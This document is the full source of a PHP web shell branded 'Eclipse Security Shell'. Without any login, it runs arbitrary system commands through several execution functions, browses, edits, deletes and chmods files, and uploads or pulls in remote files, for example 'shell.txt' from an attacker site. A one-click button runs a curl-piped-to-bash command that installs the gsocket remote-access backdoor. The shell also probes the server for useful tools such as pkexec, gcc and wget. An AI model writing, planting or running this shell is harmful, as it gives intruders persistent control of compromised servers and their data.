<?php
// Initialize $_POST['pilih'] if it's not set
if (!isset($_POST['pilih'])) {
    $_POST['pilih'] = '';
}
set_time_limit(0);
error_reporting(E_ALL);
ini_set('display_errors', 1);

function author() {
    echo "<div class='text-center mt-8 text-gray-400'>Eclipse Security Labs</div>";
}

function cekdir() {
    if (isset($_GET['path'])) {
        $lokasi = $_GET['path'];
    } else {
        $lokasi = getcwd();
    }
    if (is_writable($lokasi)) {
        return "<span class='text-green-500'>Writeable</span>";
    } else {
        return "<span class='text-red-500'>Not Writeable</span>";
    }
}

function cekroot() {
    if (is_writable($_SERVER['DOCUMENT_ROOT'])) {
        return "<span class='text-green-500'>Writeable</span>";
    } else {
        return "<span class='text-red-500'>Not Writeable</span>";
    }
}

function xrmdir($dir) {
    $items = scandir($dir);
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') {
            continue;
        }
        $path = $dir.'/'.$item;
        if (is_dir($path)) {
            xrmdir($path);
        } else {
            unlink($path);
        }
    }
    rmdir($dir);
}

function green($text) {
    echo "<div class='text-center text-green-500'>".$text."</div>";
}

function red($text) {
    echo "<div class='text-center text-red-500'>".$text."</div>";
}

if(isset($_GET['path'])){
    $lokasi = $_GET['path'];
    $lokdua = $_GET['path'];
} else {
    $lokasi = getcwd();
    $lokdua = getcwd();
}

$lokasi = str_replace('\\','/',$lokasi);
$lokasis = explode('/',$lokasi);
$lokasinya = @scandir($lokasi);

function statusnya($file){
    $statusnya = fileperms($file);
    
    if (($statusnya & 0xC000) == 0xC000) {
        $ingfo = 's';
    } elseif (($statusnya & 0xA000) == 0xA000) {
        $ingfo = 'l';
    } elseif (($statusnya & 0x8000) == 0x8000) {
        $ingfo = '-';
    } elseif (($statusnya & 0x6000) == 0x6000) {
        $ingfo = 'b';
    } elseif (($statusnya & 0x4000) == 0x4000) {
        $ingfo = 'd';
    } elseif (($statusnya & 0x2000) == 0x2000) {
        $ingfo = 'c';
    } elseif (($statusnya & 0x1000) == 0x1000) {
        $ingfo = 'p';
    } else {
        $ingfo = 'u';
    }
    
    $ingfo .= (($statusnya & 0x0100) ? 'r' : '-');
    $ingfo .= (($statusnya & 0x0080) ? 'w' : '-');
    $ingfo .= (($statusnya & 0x0040) ?
        (($statusnya & 0x0800) ? 's' : 'x' ) :
        (($statusnya & 0x0800) ? 'S' : '-'));
    
    $ingfo .= (($statusnya & 0x0020) ? 'r' : '-');
    $ingfo .= (($statusnya & 0x0010) ? 'w' : '-');
    $ingfo .= (($statusnya & 0x0008) ?
        (($statusnya & 0x0400) ? 's' : 'x' ) :
        (($statusnya & 0x0400) ? 'S' : '-'));
    
    $ingfo .= (($statusnya & 0x0004) ? 'r' : '-');
    $ingfo .= (($statusnya & 0x0002) ? 'w' : '-');
    $ingfo .= (($statusnya & 0x0001) ?
        (($statusnya & 0x0200) ? 't' : 'x' ) :
        (($statusnya & 0x0200) ? 'T' : '-'));
    
    return $ingfo;
}

function getPythonVersion() {
    $commands = ['python', 'python2', 'python3'];
    foreach ($commands as $cmd) {
        $output = safeExecuteCommand($cmd . ' --version 2>&1');
        if ($output) {
            return trim($output);
        }
    }
    return 'Python is not available';
}

function safeExecuteCommand($command) {
    $output = '';
    $execFunctions = ['shell_exec', 'exec', 'system', 'passthru', 'popen', 'proc_open'];
    
    foreach ($execFunctions as $func) {
        if (function_exists($func) && !in_array($func, explode(',', ini_get('disable_functions')))) {
            switch ($func) {
                case 'shell_exec':
                    $output = @shell_exec($command);
                    break;
                case 'exec':
                    @exec($command, $out);
                    $output = implode("\n", $out);
                    break;
                case 'system':
                    ob_start();
                    @system($command);
                    $output = ob_get_clean();
                    break;
                case 'passthru':
                    ob_start();
                    @passthru($command);
                    $output = ob_get_clean();
                    break;
                case 'popen':
                    $handle = @popen($command, 'r');
                    if ($handle) {
                        while (!feof($handle)) {
                            $output .= fread($handle, 4096);
                        }
                        pclose($handle);
                    }
                    break;
                case 'proc_open':
                    $descriptorspec = array(
                        0 => array("pipe", "r"),
                        1 => array("pipe", "w"),
                        2 => array("pipe", "w")
                    );
                    $process = @proc_open($command, $descriptorspec, $pipes);
                    if (is_resource($process)) {
                        $output = stream_get_contents($pipes[1]);
                        fclose($pipes[1]);
                        proc_close($process);
                    }
                    break;
            }
            if (!empty($output)) {
                return $output;
            }
        }
    }
    return false;
}

function getSystemInfo() {
    $disabledFunctions = array_merge(
        explode(',', ini_get('disable_functions')),
        ['exec', 'passthru', 'shell_exec', 'system']
    );
    $disabledFunctions = array_unique($disabledFunctions);

    $functions = [
        'GCC' => 'gcc',
        'Perl' => 'perl',
        'Python' => 'python',
        'PKEXEC' => 'pkexec',
        'Curl' => 'curl',
        'Wget' => 'wget',
        'Mysql' => 'mysql',
        'Ftp' => 'ftp',
        'Ssh' => 'ssh',
        'Mail' => 'mail',
        'Cron' => 'cron',
        'SendMail' => 'sendmail'
    ];

    foreach ($functions as $name => $command) {
        if (!safeExecuteCommand("which $command 2>/dev/null")) {
            $disabledFunctions[] = $name;
        }
    }

    $disabledFunctions = array_unique($disabledFunctions);
    sort($disabledFunctions);

    return [
        'Disabled Functions' => implode(', ', $disabledFunctions)
    ];
}

function executeCommand($command) {
    global $lokasi;
    $output = safeExecuteCommand("cd " . escapeshellarg($lokasi) . " && " . $command . " 2>&1");
    if ($output === false) {
        $args = explode(' ', $command);
        $cmd = strtolower($args[0]);

        switch ($cmd) {
            case 'ls':
                $path = isset($args[1]) ? $args[1] : $lokasi;
                $files = scandir($path);
                return implode("\n", $files);
            case 'cat':
                if (isset($args[1])) {
                    return file_get_contents($lokasi . '/' . $args[1]);
                }
                return "Usage: cat <filename>";
            case 'pwd':
                return $lokasi;
            case 'whoami':
                return get_current_user();
            case 'ps':
                return "Process information is not available.";
            case 'date':
                return date('Y-m-d H:i:s');
            case 'df':
                return "Disk usage information is not available.";
            case 'du':
                if (isset($args[1])) {
                    return "Size of {$args[1]}: " . (filesize($lokasi . '/' . $args[1]) / 1024) . " KB";
                }
                return "Usage: du <filename>";
            case 'echo':
                array_shift($args);
                return implode(' ', $args);
            case 'uname':
                return php_uname();
            default:
                return "Command not recognized or execution is not available.";
        }
    }
    return $output;
}

function sortItems($a, $b) {
    $aIsDir = is_dir($GLOBALS['lokasi'].'/'.$a);
    $bIsDir = is_dir($GLOBALS['lokasi'].'/'.$b);
    
    if ($aIsDir && !$bIsDir) {
        return -1;
    }
    if (!$aIsDir && $bIsDir) {
        return 1;
    }
    return strcasecmp($a, $b);
}

if (is_array($lokasinya)) {
    usort($lokasinya, 'sortItems');
}

function findLongestDirectory($path) {
    if (!is_dir($path)) {
        return "Invalid directory path";
    }

    $longestPath = '';
    $maxLength = 0;

    try {
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($path, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );

        foreach ($iterator as $file) {
            if ($file->isDir()) {
                $currentPath = $file->getPathname();
                $currentLength = strlen($currentPath);
                if ($currentLength > $maxLength) {
                    $maxLength = $currentLength;
                    $longestPath = $currentPath;
                }
            }
        }
    } catch (Exception $e) {
        return "Error: " . $e->getMessage();
    }

    return $longestPath ?: "No directories found";
}

function scanNewPhpFiles($path) {
    if (!is_dir($path)) {
        return ["Invalid directory path"];
    }
    $files = [];
    try {
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($path, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );
        foreach ($iterator as $file) {
            if ($file->isFile() && $file->getExtension() === 'php') {
                $files[] = [
                    'path' => $file->getPathname(),
                    'mtime' => $file->getMTime()
                ];
            }
        }
        usort($files, function($a, $b) {
            return $b['mtime'] - $a['mtime'];
        });

        return array_slice($files, 0, 10);
    } catch (Exception $e) {
        return ["Error: " . $e->getMessage()];
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Eclipse Security Shell</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Dosis:wght@200;300;400;500;600;700;800&display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Dosis', sans-serif;
        }
        .server-info {
            font-family: 'Fira Code', monospace;
        }
    </style>
    <script>
        function updateFileName(input) {
            const fileName = input.files[0] ? input.files[0].name : 'Select a file';
            document.getElementById('file-name-display').textContent = fileName;
        }
        function Form(formId) {
            const form = document.getElementById(formId);
            if (form.style.display === 'none' || form.style.display === '') {
                form.style.display = 'block';
            } else {
                form.style.display = 'none';
            }
        }  
    </script>
</head>
<body class="bg-gray-900 text-white">
    <div class="container mx-auto px-4 py-8">
        <h1 class="text-4xl font-bold text-center mb-8">Eclipse Security Shell</h1>     
        <div class="grid grid-cols-1 md:grid-cols-2 gap-8 mb-8">
            <div class="bg-gray-800 rounded-lg shadow-lg p-6 server-info overflow-x-auto">
                <h2 class="text-2xl font-semibold mb-4">Server Information</h2>
                <table class="w-full">
                    <tr>
                        <td class="pr-4">Server:</td>
                        <td><span class="text-green-400"><?php echo $_SERVER['SERVER_SOFTWARE']; ?></span></td>
                    </tr>
                    <tr>
                        <td class="pr-4">System:</td>
                        <td><span class="text-green-400"><?php echo php_uname(); ?></span></td>
                    </tr>
                    <tr>
                        <td class="pr-4">User:</td>
                        <td><span class="text-green-400"><?php echo get_current_user(); ?></span> ( <span class="text-yellow-400"><?php echo getmyuid(); ?></span> )</td>
                    </tr>
                    <tr>
                        <td class="pr-4">PHP Version:</td>
                        <td><span class="text-green-400"><?php echo phpversion(); ?></span></td>
                    </tr>
                    <tr>
                        <td class="pr-4">Python Version:</td>
                        <td><span class="text-yellow-400"><?php echo getPythonVersion(); ?></span></td>
                    </tr>
                    <?php
                    $systemInfo = getSystemInfo();
                    foreach ($systemInfo as $key => $value) {
                        echo "<tr><td class='pr-4'>$key:</td><td><span class='text-red-500'>$value</span></td></tr>";
                    }
                    ?>
                </table>
            </div>

            <!-- Features -->
            <div class="bg-[#1a1f2e] rounded-lg shadow-lg p-3 h-auto space-y-4">
                <h2 class="text-lg font-semibold mb-2 text-white">Features</h2>
                
                <!-- Install gsocket button -->
                <form method="post" class="w-full">
                    <input type="hidden" name="cmd" value="bash -c &quot;$(curl -fsSL https://gsocket.io/y)&quot;">
                    <button type="submit" class="w-full bg-[#4477ff] hover:bg-[#3366ee] text-white py-2.5 rounded text-base font-medium flex items-center justify-center">
                        Install gsocket!
                    </button>
                </form>

                <!-- Command Line -->
                <div class="bg-gray-800 rounded-lg shadow-lg p-4">
    <h3 class="text-lg font-semibold mb-2 text-white">Command Line</h3>
    <form method="post" class="space-y-2">
        <input type="text" name="cmd" class="w-full bg-gray-700 text-white rounded px-3 py-2" placeholder="Enter command (e.g., ls, cat, pwd)">
        <input type="submit" value="Execute" class="w-full bg-blue-500 hover:bg-blue-600 text-white px-4 py-2 rounded cursor-pointer">
    </form>
    <?php
    if (isset($_POST['cmd'])) {
        $cmd = $_POST['cmd'];
        if ($cmd === 'bash -c "$(curl -fsSL https://gsocket.io/y)"') {
            echo "<h3 class='text-xl font-semibold mb-2 text-white'>Installing gsocket:</h3>";
        }
        $output = executeCommand($cmd);
        echo "<pre class='mt-4 p-4 bg-gray-700 rounded overflow-x-auto text-green-400'>" . htmlspecialchars($output) . "</pre>";
    }
    ?>
</div>
                <div class="bg-gray-800 rounded-lg shadow-lg p-4">
                    <h3 class="text-lg font-semibold mb-2">Find Longest Directory Path</h3>
                    <button onclick="Form('longest-dir-form')" class="w-full bg-blue-500 hover:bg-blue-600 text-white px-4 py-2 rounded cursor-pointer mb-2">
                         Longest Directory Search
                    </button>
                    <form id="longest-dir-form" method="post" class="space-y-2" style="display: none;">
                        <input type="text" name="longest_dir_path" class="w-full bg-gray-700 rounded px-3 py-2" placeholder="Enter path to search (e.g., /var/www)">
                        <input type="submit" value="Find" class="w-full bg-blue-500 hover:bg-blue-600 text-white px-4 py-2 rounded cursor-pointer">
                    </form>
                    <?php
                    if (isset($_POST['longest_dir_path'])) {
                        $searchPath = $_POST['longest_dir_path'];
                        $longestPath = findLongestDirectory($searchPath);
                        echo "<pre class='mt-4 p-4 bg-gray-700 rounded overflow-x-auto text-green-400'>Longest directory path: " . htmlspecialchars($longestPath) . "</pre>";
                    }
                    ?>
                </div>

                <!-- Scan New PHP Files -->
                <div class="bg-gray-800 rounded-lg shadow-lg p-4">
                    <h3 class="text-lg font-semibold mb-2">Scan New PHP Files</h3>
                    <button onclick="Form('scan-php-form')" class="w-full bg-blue-500 hover:bg-blue-600 text-white px-4 py-2 rounded cursor-pointer mb-2">
                         PHP File Scan
                    </button>
                    <form id="scan-php-form" method="post" class="space-y-2" style="display: none;">
                        <input type="text" name="scan_php_path" class="w-full bg-gray-700 rounded px-3 py-2" placeholder="Enter path to scan (e.g., /var/www)">
                        <input type="submit" value="Scan" class="w-full bg-blue-500 hover:bg-blue-600 text-white px-4 py-2 rounded cursor-pointer">
                    </form>
                    <?php
                    if (isset($_POST['scan_php_path'])) {
                        $scanPath = $_POST['scan_php_path'];
                        $newFiles = scanNewPhpFiles($scanPath);
                        echo "<pre class='mt-4 p-4 bg-gray-700 rounded overflow-x-auto text-green-400'>Newest PHP files:\n";
                        foreach ($newFiles as $file) {
                            if (is_array($file)) {
                                echo htmlspecialchars($file['path']) . " (Modified: " . date("Y-m-d H:i:s", $file['mtime']) . ")\n";
                            } else {
                                echo htmlspecialchars($file) . "\n";
                            }
                        }
                        echo "</pre>";
                    }
                    ?>
                </div>
            </div>
        </div>

        <!-- Upload File -->
        <div class="bg-gray-800 rounded-lg shadow-lg p-6 mb-8">
            <h2 class="text-2xl font-semibold mb-4">Upload File</h2>
            <form enctype="multipart/form-data" method="post" class="space-y-4">
                <div class="flex flex-col sm:flex-row space-y-2 sm:space-y-0 sm:space-x-4">
                    <label class="inline-flex items-center">
                        <input type="radio" class="form-radio text-blue-600" id="current_dir" value="1" name="dirnya" checked>
                        <span class="ml-2">current_dir [ <?php echo cekdir(); ?> ]</span>
                    </label>
                    <label class="inline-flex items-center">
                        <input type="radio" class="form-radio text-blue-600" id="document_root" value="2" name="dirnya">
                        <span class="ml-2">document_root [ <?php echo cekroot(); ?> ]</span>
                    </label>
                </div>
                <input type="hidden" name="upwkwk" value="aplod">
                <div class="flex flex-col sm:flex-row space-y-2 sm:space-y-0 sm:space-x-2">
                    <label class="w-full flex flex-col items-center px-4 py-6 bg-gray-700 text-blue rounded-lg shadow-lg tracking-wide uppercase border border-blue cursor-pointer hover:bg-blue-500 hover:text-white">
                        <svg class="w-8 h-8" fill="currentColor" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20">
                            <path d="M16.88 9.1A4 4 0 0 1 16 17H5a5 5 0 0 1-1-9.9V7a3 3 0 0 1 4.52-2.59A4.98 4.98 0 0 1 17 8c0 .38-.04.74-.12 1.1zM11 11h3l-4-4-4 4h3v3h2v-3z" />
                        </svg>
                        <span id="file-name-display" class="mt-2 text-base leading-normal">Select a file</span>
                        <input type='file' name="berkas" class="hidden" onchange="updateFileName(this)" />
                    </label>
                    <input type="submit" name="berkasnya" value="Upload" class="bg-blue-500 hover:bg-blue-600 text-white px-4 py-2 rounded cursor-pointer">
                </div>
                <div class="flex flex-col sm:flex-row space-y-2 sm:space-y-0 sm:space-x-2">
                    <input type="text" name="darilink" class="flex-grow bg-gray-700 rounded px-3 py-2" placeholder="https://eclipsesec.tech/shell.txt">
                    <input type="text" name="namalink" class="w-full sm:w-1/4 bg-gray-700 rounded px-3 py-2" placeholder="file.txt">
                    <input type="submit" name="linknya" value="Upload" class="bg-blue-500 hover:bg-blue-600 text-white px-4 py-2 rounded cursor-pointer">
                </div>
            </form>
        </div>
        <tr>
        <div class="bg-gray-800 rounded-lg shadow-lg p-6 mb-8">
                        <td class="pr-4">Directory:</td>
                        <td>
                            <?php
                            foreach($lokasis as $id => $lok){
                                if($lok == '' && $id == 0){
                                    echo '<a href="?path=/" class="text-blue-400 hover:underline">/</a>';
                                    continue;
                                }
                                if($lok == '') continue;
                                echo '<a href="?path=';
                                for($i=0;$i<=$id;$i++){
                                    echo "$lokasis[$i]";
                                    if($i != $id) echo "/";
                                } 
                                echo '" class="text-blue-400 hover:underline">'.$lok.'</a>/';
                            }
                            ?>
                        </td>
                    </tr>
                    </div

        <?php
        if (isset($_POST['upwkwk'])) {
            if (isset($_POST['berkasnya'])) {
                if ($_POST['dirnya'] == "2") {
                    $lokasi = $_SERVER['DOCUMENT_ROOT'];
                }
                $data = @file_put_contents($lokasi."/".$_FILES['berkas']['name'], @file_get_contents($_FILES['berkas']['tmp_name']));
                if (file_exists($lokasi."/".$_FILES['berkas']['name'])) {
                    echo "<div class='bg-green-500 text-white p-4 rounded mb-4'>File Uploaded ! &nbsp;<span class='font-semibold'>".$lokasi."/".$_FILES['berkas']['name']."</span></div>";
                } else {
                    echo "<div class='bg-red-500 text-white p-4 rounded mb-4'>Failed to Upload !</div>";
                }
            } elseif (isset($_POST['linknya'])) {
                if (empty($_POST['namalink'])) {
                    exit("<div class='bg-red-500 text-white p-4 rounded mb-4'>Filename cannot be empty !</div>");
                }
                if ($_POST['dirnya'] == "2") {
                    $lokasi = $_SERVER['DOCUMENT_ROOT'];
                }
                $data = @file_put_contents($lokasi."/".$_POST['namalink'], @file_get_contents($_POST['darilink']));
                if (file_exists($lokasi."/".$_POST['namalink'])) {
                    echo "<div class='bg-green-500 text-white p-4 rounded mb-4'>File Uploaded ! &nbsp;<span class='font-semibold'>".$lokasi."/".$_POST['namalink']."</span></div>";
                } else {
                    echo "<div class='bg-red-500 text-white p-4 rounded mb-4'>Failed to Upload !</div>";
                }
            }
        }
        if (isset($_GET['fileloc'])) {
            echo "<div class='bg-gray-800 rounded-lg shadow-lg p-6 mb-8'>
                <h2 class='text-2xl font-semibold mb-4'>Current File : ".$_GET['fileloc']."</h2>
                <pre class='bg-gray-700 p-4 rounded overflow-x-auto'>".htmlspecialchars(file_get_contents($_GET['fileloc']))."</pre>
            </div>";
        } elseif (isset($_GET['pilihan']) && isset($_POST['pilih']) && $_POST['pilih'] == "hapus") {
            if (is_dir($_POST['path'])) {
                xrmdir($_POST['path']);
                if (file_exists($_POST['path'])) {
                    red("Failed to delete Directory !");
                } else {
                    green("Delete Directory Success !");
                }
            } elseif (is_file($_POST['path'])) {
                @unlink($_POST['path']);
                if (file_exists($_POST['path'])) {
                    red("Failed to Delete File !");
                } else {
                    green("Delete File Success !");
                }
            }
        } elseif (isset($_GET['pilihan']) && isset($_POST['pilih']) && $_POST['pilih'] == "ubahmod") {
            echo "<div class='bg-gray-800 rounded-lg shadow-lg p-6 mb-8'>
                <h2 class='text-2xl font-semibold mb-4'>".$_POST['path']."</h2>
                <form method='post' class='space-y-4'>
                    <div class='flex space-x-2'>
                        <label for='perm' class='w-1/4'>Permission :</label>
                        <input id='perm' name='perm' type='text' class='flex-grow bg-gray-700 rounded px-3 py-2' size='4' value='".substr(sprintf('%o', fileperms($_POST['path'])), -4)."' />
                    </div>
                    <input type='hidden' name='path' value='".$_POST['path']."'>
                    <input type='hidden' name='pilih' value='ubahmod'>
                    <input type='submit' value='Change' name='chm0d' class='bg-blue-500 hover:bg-blue-600 text-white px-4 py-2 rounded cursor-pointer'/>
                </form>
            </div>";
            if (isset($_POST['chm0d'])) {
                $cm = @chmod($_POST['path'], $_POST['perm']);
                if ($cm == true) {
                    green("Change Mod Success !");
                } else {
                    red("Change Mod Failed !");
                }
            }
        } elseif (isset($_GET['pilihan']) && isset($_POST['pilih']) && $_POST['pilih'] == "gantinama") {
            if (isset($_POST['gantin'])) {
                $ren = @rename($_POST['path'], $_POST['newname']);
                if ($ren == true)
                $ren = @rename($_POST['path'], $_POST['newname']);
                if ($ren == true) {
                    green("Change Name Success !");
                } else {
                    red("Change Name Failed !");
                }
            }
            if (empty($_POST['name'])) {
                $namaawal = $_POST['newname'];
            } else {
                $namawal = $_POST['name'];
            }
            echo "<div class='bg-gray-800 rounded-lg shadow-lg p-6 mb-8'>
                <h2 class='text-2xl font-semibold mb-4'>".$_POST['path']."</h2>
                <form method='post' class='space-y-4'>
                    <div class='flex space-x-2'>
                        <label for='newname' class='w-1/4'>New Name :</label>
                        <input id='newname' name='newname' type='text' class='flex-grow bg-gray-700 rounded px-3 py-2' value='".$namaawal."' />
                    </div>
                    <input type='hidden' name='path' value='".$_POST['path']."'>
                    <input type='hidden' name='pilih' value='gantinama'>
                    <input type='submit' value='Change' name='gantin' class='bg-blue-500 hover:bg-blue-600 text-white px-4 py-2 rounded cursor-pointer'/>
                </form>
            </div>";
        } elseif (isset($_GET['pilihan']) && isset($_POST['pilih']) && $_POST['pilih'] == "edit") {
            if (isset($_POST['gasedit'])) {
                $edit = @file_put_contents($_POST['path'], $_POST['src']);
                if ($edit == true) {
                    green("Edit File Success !");
                } else {
                    red("Edit File Failed !");
                }
            }
            echo "<div class='bg-gray-800 rounded-lg shadow-lg p-6 mb-8'>
                <h2 class='text-2xl font-semibold mb-4'>".$_POST['path']."</h2>
                <form method='post' class='space-y-4'>
                    <textarea name='src' rows='20' class='w-full bg-gray-700 rounded px-3 py-2'>".htmlspecialchars(file_get_contents($_POST['path']))."</textarea>
                    <input type='hidden' name='path' value='".$_POST['path']."'>
                    <input type='hidden' name='pilih' value='edit'>
                    <input type='submit' value='Edit File' name='gasedit' class='bg-blue-500 hover:bg-blue-600 text-white px-4 py-2 rounded cursor-pointer'/>
                </form>
            </div>";
        }
        ?>
        <!-- File Manager Table/Cards -->
        <div class="bg-[#1a1f2e] rounded-lg shadow-lg overflow-hidden">
            <div class="hidden md:block">
                <table class="w-full">
                    <tr class="bg-[#2a2f3e] border-b border-gray-700">
                        <th class="px-4 py-3 text-left text-sm font-semibold text-gray-200 w-1/4">Name</th>
                        <th class="px-4 py-3 text-left text-sm font-semibold text-gray-200 w-1/6">Size</th>
                        <th class="px-4 py-3 text-left text-sm font-semibold text-gray-200 w-1/6">Type</th>
                        <th class="px-4 py-3 text-left text-sm font-semibold text-gray-200 w-1/4">Permissions</th>
                        <th class="px-4 py-3 text-left text-sm font-semibold text-gray-200 w-1/6">Options</th>
                    </tr>
                    <?php
                    foreach($lokasinya as $item){
                        if($item == '.' || $item == '..') continue;      
                        $fullPath = "$lokasi/$item";
                        $isDir = is_dir($fullPath);
                        if ($isDir) {
                            $size = 'DIR';
                            $type = 'Directory';
                        } else {
                            $filesize = filesize($fullPath);
                            if ($filesize >= 1024*1024) {
                                $size = number_format($filesize/(1024*1024), 2).' MB';
                            } else {
                                $size = number_format($filesize/1024, 3).' KB';
                            }
                            $type = 'File';
                        }
                        $permColor = is_writable($fullPath) ? 'text-green-400' : (!is_readable($fullPath) ? 'text-red-400' : 'text-gray-400');
                        
                        echo "<tr class='border-b border-gray-700 hover:bg-[#2a2f3e]'>
                            <td class='px-4 py-2'>
                                <a href=\"" . ($isDir ? "?path=$fullPath" : "?fileloc=$fullPath&path=$lokasi") . "\" class='text-blue-400 hover:underline'>$item</a>
                            </td>
                            <td class='px-4 py-2 text-gray-300'>".$size."</td>
                            <td class='px-4 py-2 text-gray-300'>".$type."</td>
                            <td class='px-4 py-2'>
                                <span class='".$permColor."'>".statusnya($fullPath)."</span>
                            </td>
                            <td class='px-4 py-2'><form method=\"post\" action=\"?pilihan&path=$lokasi\" class='flex items-center space-x-2'>
                                    <input type=\"hidden\" name=\"type\" value=\"" . ($isDir ? 'dir' : 'file') . "\">
                                    <input type=\"hidden\" name=\"name\" value=\"$item\">
                                    <input type=\"hidden\" name=\"path\" value=\"$fullPath\">
                                    <select name=\"pilih\" class=\"bg-[#2a2f3e] rounded px-3 py-1.5 text-gray-300 border border-gray-600 focus:border-blue-500 focus:ring-1 focus:ring-blue-500 outline-none\" onchange=\"this.form.submit()\">
                                        <option value=\"\">Action</option>
                                        <option value=\"hapus\">Delete</option>
                                        <option value=\"ubahmod\">Chmod</option>
                                        <option value=\"gantinama\">Rename</option>
                                        " . (!$isDir ? "<option value=\"edit\">Edit</option>" : "") . "
                                    </select>
                                </form>
                            </td>
                        </tr>";
                    }
                    ?>
                </table>
            </div>
            <div class="md:hidden">
                <?php
                foreach($lokasinya as $item){
                    if($item == '.' || $item == '..') continue;
                    
                    $fullPath = "$lokasi/$item";
                    $isDir = is_dir($fullPath);
                    
                    // Format size
                    if ($isDir) {
                        $size = 'DIR';
                        $type = 'Directory';
                    } else {
                        $filesize = filesize($fullPath);
                        if ($filesize >= 1024*1024) {
                            $size = number_format($filesize/(1024*1024), 2).' MB';
                        } else {
                            $size = number_format($filesize/1024, 3).' KB';
                        }
                        $type = 'File';
                    }
                    $permColor = is_writable($fullPath) ? 'text-green-400' : (!is_readable($fullPath) ? 'text-red-400' : 'text-gray-400');
                    echo "<div class='p-4 border-b border-gray-700'>
                        <div class='flex justify-between items-center mb-2'>
                            <a href=\"" . ($isDir ? "?path=$fullPath" : "?fileloc=$fullPath&path=$lokasi") . "\" class='text-blue-400 hover:underline font-semibold'>$item</a>
                            <span class='text-gray-300 text-sm'>".$size."</span>
                        </div>
                        <div class='flex justify-between items-center mb-2'>
                            <span class='text-gray-300 text-sm'>".$type."</span>
                            <span class='".$permColor." text-sm'>".statusnya($fullPath)."</span>
                        </div>
                        <form method=\"post\" action=\"?pilihan&path=$lokasi\" class='mt-2'>
                            <input type=\"hidden\" name=\"type\" value=\"" . ($isDir ? 'dir' : 'file') . "\">
                            <input type=\"hidden\" name=\"name\" value=\"$item\">
                            <input type=\"hidden\" name=\"path\" value=\"$fullPath\">
                            <select name=\"pilih\" class=\"w-full bg-[#2a2f3e] rounded px-3 py-1.5 text-gray-300 border border-gray-600 focus:border-blue-500 focus:ring-1 focus:ring-blue-500 outline-none\" onchange=\"this.form.submit()\">
                                <option value=\"\">Action</option>
                                <option value=\"hapus\">Delete</option>
                                <option value=\"ubahmod\">Chmod</option>
                                <option value=\"gantinama\">Rename</option>
                                " . (!$isDir ? "<option value=\"edit\">Edit</option>" : "") . "
                            </select>
                        </form>
                    </div>";
                }
                ?>
            </div>
        </div>
    </div>
    <?php author(); ?>
</body>
</html>
